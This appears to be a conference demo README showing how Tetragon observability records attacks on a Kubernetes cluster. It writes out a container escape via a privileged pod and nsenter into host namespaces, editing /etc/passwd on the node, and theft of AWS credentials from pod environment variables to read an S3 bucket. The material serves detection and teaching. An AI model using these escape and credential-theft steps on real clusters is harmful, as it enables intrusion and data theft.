## Uncovering a Sophisticated Attack In Real Time - WTF is SRE?, London, 2023

This repository contains the demo and the corresponding instructions that was presented at
the "WTF is SRE?" conference in London in 2023 May 5th, during the "Uncovering a Sophisticated Attack In Real Time" presentation.

### Setting up the environment

Create GKE cluster:
```bash
gcloud container clusters create "${NAME}" \
  --zone europe-central2-a \
  --num-nodes 1
```

Check if the cluster is up:
```bash
kubectl get nodes -o wide
NAME                                                  STATUS   ROLES    AGE    VERSION            INTERNAL-IP    EXTERNAL-IP      OS-IMAGE                             KERNEL-VERSION   CONTAINER-RUNTIME
gke-wtf-is-sre-2023-nata-default-pool-6a2f1f1a-dgph   Ready    <none>   3m8s   v1.25.7-gke.1000   10.186.0.106   34.116.194.186   Container-Optimized OS from Google   5.15.65+         containerd://1.6.18
```

Deploy Tetragon:
```bash
helm repo add isovalent https://helm.isovalent.com
helm repo update
helm install -n kube-system hubble-enterprise isovalent/hubble-enterprise --version v1.9.6 -f tetragon.yaml
```

Check if Tetragon is running:
```bash
kubectl get pods -n kube-system
NAME                                                             READY   STATUS    RESTARTS   AGE
...
hubble-enterprise-zw77t                                          2/2     Running   0          3m21s
...
```

Enable credential and namespace information in the events:
```bash
kubectl edit cm -n kube-system hubble-enterprise-config
...
  enable-process-cred: "true" # set to true
  enable-process-ns: "true" # set to true
```

Restart daemonset:
```bash
kubectl delete pods -n kube-system hubble-enterprise-zw77t
pod "hubble-enterprise-zw77t" deleted
```

Apply Networking (socket level) TracingPolicy:
```bash
kubectl apply -f network.yaml
tracingpolicy.cilium.io/tcp created
```

Apply Syscall Observability TracingPolicies:
```bash
kubectl apply -f sys_setns.yaml
tracingpolicy.cilium.io/sys-setns created
```

#### Demo I. - Container Escape

Start observing the events from Tetragon:
```bash
kubectl exec -it -n kube-system hubble-enterprise-62t4p -c enterprise -- /bin/bash
hubble-enterprise getevents -o compact --pod privileged
```

Explain the privileged pod spec:
```bash
apiVersion: v1
kind: Pod
metadata:
  name: privileged-the-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: privileged-the-pod
    image: nginx:latest
    ports:
    - containerPort: 80
    securityContext:
      privileged: true
```

Notes:
- The `privileged: true` flag can be enabled in GKE in the `securityContext` by default. It's dangerous because it
gives high level privileges to the starting pod. 
- the `hostPID` flag gives access to the Pod to the host PID namespace
- the `hostNetwork` flag gives access to the Pod to the host network namespace

These combinations gives us an advantage to break out from the container and get access to the resources on the node.

Start the privileged pod:
```bash
kubectl apply -f privileged.yaml
pod/privileged-the-pod created
```

Observe the events. The main highlights are:

Starting the container with the `docker-entrypoint.sh` script, nginx daemon is staring
```bash
🚀 process default/privileged-the-pod /docker-entrypoint.sh /docker-entrypoint.sh nginx -g "daemon off;" 🛑 CAP_SYS_ADMIN
```

Listen on ipv6 by default:
```bash
🚀 process default/privileged-the-pod /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh 🛑 CAP_SYS_ADMIN
```

Setup certain nginx configuration files:
```bash
🚀 process default/privileged-the-pod /bin/grep -q "listen  \[::]\:80;" /etc/nginx/conf.d/default.conf 🛑 CAP_SYS_ADMIN
🚀 process default/privileged-the-pod /usr/bin/dpkg-query --show --showformat=${Conffiles}\n nginx 🛑 CAP_SYS_ADMIN
💥 exit    default/privileged-the-pod /usr/bin/touch /etc/nginx/conf.d/default.conf 0 🛑 CAP_SYS_ADMIN
🚀 process default/privileged-the-pod /bin/grep etc/nginx/conf.d/default.conf 🛑 CAP_SYS_ADMIN
💥 exit    default/privileged-the-pod /bin/grep -q "listen  \[::]\:80;" /etc/nginx/conf.d/default.conf 1 🛑 CAP_SYS_ADMIN
```

Listen on port 80:
```bash
🚀 process default/privileged-the-pod /bin/sed -i -E "s,listen       80;,listen       80;\n    listen  [::]:80;," /etc/nginx/conf.d/default.conf 🛑 CAP_SYS_ADMIN
...
🚀 process default/privileged-the-pod /usr/sbin/nginx -g "daemon off;" 🛑 CAP_SYS_ADMIN
🎧 listen  default/privileged-the-pod /usr/sbin/nginx TCP 0.0.0.0:80 🛑 CAP_SYS_ADMIN
🎧 listen  default/privileged-the-pod /usr/sbin/nginx TCP :::80 🛑 CAP_SYS_ADMIN
```

`kubectl exec` into the privileged nginx pod:
```bash
kubectl exec -it privileged-the-pod -- /bin/bash
```

Pick up the `shell` execution:
```bash
🚀 process default/privileged-the-pod /bin/bash            🛑 CAP_SYS_ADMIN
```

Execute `nsenter` to enter into the 5 host namespaces (mount, user, network, pid, ipc) from the privileged pod and run bash as a host:
```bash
nsenter -t 1 -m -u -n -i -p bash
```

Observe the events:
```bash
🚀 process default/privileged-the-pod /usr/bin/nsenter -t 1 -m -u -n -i -p bash 🛑 CAP_SYS_ADMIN
🔧 setns   default/privileged-the-pod /usr/bin/nsenter ipc          🛑 CAP_SYS_ADMIN
🔧 setns   default/privileged-the-pod /usr/bin/nsenter uts          🛑 CAP_SYS_ADMIN
🔧 setns   default/privileged-the-pod /usr/bin/nsenter net          🛑 CAP_SYS_ADMIN
🔧 setns   default/privileged-the-pod /usr/bin/nsenter pid          🛑 CAP_SYS_ADMIN
🔧 setns   default/privileged-the-pod /usr/bin/nsenter mnt          🛑 CAP_SYS_ADMIN
🚀 process default/privileged-the-pod /bin/bash            🛑 CAP_SYS_ADMIN
```

Apply the File Integrity Monitoring Policy:
```bash
kubectl apply -f file.yaml
```

Let's see if we are in the host filesystem indeed. We can do that by reading `/proc/partitions`:
```bash
cat /proc/partitions
major minor  #blocks  name

   8        0  104857600 sda
   8        1  100505583 sda1
   8        2      16384 sda2
   8        3    2097152 sda3
   8        4      16384 sda4
   8        5    2097152 sda5
   8        6          0 sda6
   8        7          0 sda7
   8        8      16384 sda8
   8        9          0 sda9
   8       10          0 sda10
   8       11       8192 sda11
   8       12      32768 sda12
 253        0    2038784 dm-0
```

Notes:
- the partitions displayed here is actually partitions from the host
- we have indeed access to the node resources, breaking the boundary between containers and the host.

Observe the events:
```bash
🚀 process default/privileged-the-pod /bin/cat --coreutils-prog-shebang=cat /bin/cat /proc/partitions 🛑 CAP_SYS_ADMIN
📬 open    default/privileged-the-pod /bin/cat /proc/partitions 🛑 CAP_SYS_ADMIN
📪 close   default/privileged-the-pod /bin/cat                      🛑 CAP_SYS_ADMIN
💥 exit    default/privileged-the-pod /bin/cat --coreutils-prog-shebang=cat /bin/cat /proc/partitions 0 🛑 CAP_SYS_ADMIN
```

Let's add a new user to `/etc/passwd` and save it:
```bash
vi /etc/passwd
```

Observe the events:
```bash
🚀 process default/privileged-the-pod /usr/bin/vi /etc/passwd 🛑 CAP_SYS_ADMIN
📬 open    default/privileged-the-pod /usr/bin/vi /etc/passwd 🛑 CAP_SYS_ADMIN
📪 close   default/privileged-the-pod /usr/bin/vi                   🛑 CAP_SYS_ADMIN
📬 open    default/privileged-the-pod /usr/bin/vi /etc/passwd 🛑 CAP_SYS_ADMIN
📪 close   default/privileged-the-pod /usr/bin/vi                   🛑 CAP_SYS_ADMIN
📬 open    default/privileged-the-pod /usr/bin/vi /etc/passwd 🛑 CAP_SYS_ADMIN
📪 close   default/privileged-the-pod /usr/bin/vi                   🛑 CAP_SYS_ADMIN
📬 open    default/privileged-the-pod /usr/bin/vi /etc/passwd 🛑 CAP_SYS_ADMIN
📝 write   default/privileged-the-pod /usr/bin/vi /etc/passwd 3915 bytes 🛑 CAP_SYS_ADMIN
📪 close   default/privileged-the-pod /usr/bin/vi                   🛑 CAP_SYS_ADMIN
💥 exit    default/privileged-the-pod /usr/bin/vi /etc/passwd 0 🛑 CAP_SYS_ADMIN
```

#### Demo II. - Stealing Sensitive information

Create the new `tenant-jobs` namespace:
```bash
kubectl create ns tenant-jobs
namespace/tenant-jobs created
```

Deploy slightly modified version of jobs-app:
```bash
kubectl apply -f jobs-app.yaml -n tenant-jobs
service/jobposting created
deployment.apps/jobposting created
service/recruiter created
...
```

Wait until the services are running:
```bash
kubectl get pods -n tenant-jobs
NAME                            READY   STATUS    RESTARTS     AGE
coreapi-9b86fc969-xk46s         1/1     Running   2 (4d ago)   4d
crawler-6f5c75d8fd-gq2h8        1/1     Running   0            4d
elasticsearch-ddcb9d785-s7nkl   1/1     Running   0            4d
jobposting-76dff7dcfd-d98gb     1/1     Running   0            4d
kafka-0                         1/1     Running   0            4d
loader-844884db59-qjwsv         1/1     Running   0            4d
recruiter-557755c86c-lg64f      1/1     Running   0            4d
zookeeper-7c65f9f8d9-2ldf5      1/1     Running   0            4d
```

`kubectl exec` into the jobposting pod:
```bash
kubectl exec -it -n tenant-jobs jobposting-76dff7dcfd-d98gb -- /bin/sh
/opt/app #
```

Install and configure aws cli:
```bash
apk --no-cache add python3 py3-pip
pip3 install --upgrade pip
pip3 install --no-cache-dir awscli
aws configure
```

This is where the attack scenario starts, we assume that the `jobposting` pod was already compromised.

Start observing the events:
```bash
hubble-enterprise getevents -o compact --pod jobposting
```

Look for environment variables, that can contain sensitive data:
```bash
env
```

Notice, that we have access to an `AWS_ACCESS_KEY` and an `AWS_SECRET_KEY` and an `S3` bucket:
```bash
AWS_ACCESS_KEY=AK33Z4L99999G6G34U55
AWS_SECRET_KEY=llSuhWelcometoXZsAOHorbbHodorkaBEidoLonndon6Yh
S3_BUCKET=wtf-is-sre-2023-welcome
```

Let's try to list what is in that S3 bucket:
```bash
/opt/app # aws s3 ls wtf-is-sre-2023-welcome
2023-04-27 13:11:12        176 dragon.png
```

Observe the events:
```bash
🚀 process tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws /usr/bin/aws s3 ls wtf-is-sre-2023-welcome
🚀 process tenant-jobs/jobposting-98dc4f858-9nh7v /bin/uname -p
💥 exit    tenant-jobs/jobposting-98dc4f858-9nh7v /bin/uname -p 0
🔌 connect tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:49420 => 52.217.201.241:443
🔌 connect tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:34208 => 52.95.142.94:443
🧹 close   tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:34208 => 52.95.142.94:443 tx 1.4 kB rx 6.8 kB
🧮 socket  tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:34208 => 52.95.142.94:443 tx 1.4 kB rx 6.8 kB
💥 exit    tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws /usr/bin/aws s3 ls wtf-is-sre-2023-welcome 0
🧹 close   tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:49420 => 52.217.201.241:443 tx 1.3 kB rx 6.5 kB
🧮 socket  tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:49420 => 52.217.201.241:443 tx 1.3 kB rx 6.5 kB
```

Let's try to download that picture:
```bash
aws s3 cp s3://wtf-is-sre-2023-welcome/dragon.png ./
```

Observe the events:
```bash
🚀 process tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws /usr/bin/aws s3 cp s3://wtf-is-sre-2023-welcome/dragon.png ./
🚀 process tenant-jobs/jobposting-98dc4f858-9nh7v /bin/uname -p
💥 exit    tenant-jobs/jobposting-98dc4f858-9nh7v /bin/uname -p 0
🔌 connect tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:37312 => 52.95.143.27:443
🧹 close   tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:37312 => 52.95.143.27:443 tx 1.3 kB rx 5.8 kB
🧮 socket  tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:37312 => 52.95.143.27:443 tx 1.3 kB rx 5.8 kB
🔌 connect tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:37328 => 52.95.143.27:443
🧹 close   tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:37328 => 52.95.143.27:443 tx 1.3 kB rx 5.8 kB
🧮 socket  tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:37328 => 52.95.143.27:443 tx 1.3 kB rx 5.8 kB
🔌 connect tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:49450 => 52.95.150.102:443
🔌 connect tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:37338 => 52.95.143.27:443
🧹 close   tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:37338 => 52.95.143.27:443 tx 1.3 kB rx 6.3 kB
🧮 socket  tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:37338 => 52.95.143.27:443 tx 1.3 kB rx 6.3 kB
🔌 connect tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:49452 => 52.95.150.102:443
🧹 close   tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:49452 => 52.95.150.102:443 tx 1.3 kB rx 6.6 kB
🧮 socket  tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:49452 => 52.95.150.102:443 tx 1.3 kB rx 6.6 kB
🧹 close   tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:49450 => 52.95.150.102:443 tx 2.0 kB rx 6.7 kB
🧮 socket  tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws TCP 10.12.0.63:49450 => 52.95.150.102:443 tx 2.0 kB rx 6.7 kB
💥 exit    tenant-jobs/jobposting-98dc4f858-9nh7v /usr/bin/aws /usr/bin/aws s3 cp s3://wtf-is-sre-2023-welcome/dragon.png ./ 0
```

Check the picture :)
```bash
/opt/app # cat dragon.png
|￣￣￣￣￣￣￣￣￣￣￣￣|
| YOU HAVE BEEN PWND |
|         :)         |
|＿＿＿＿＿＿＿＿＿＿＿＿|
      \ (•◡•) /
       \     /
         ---
        |   |
/opt/app #
```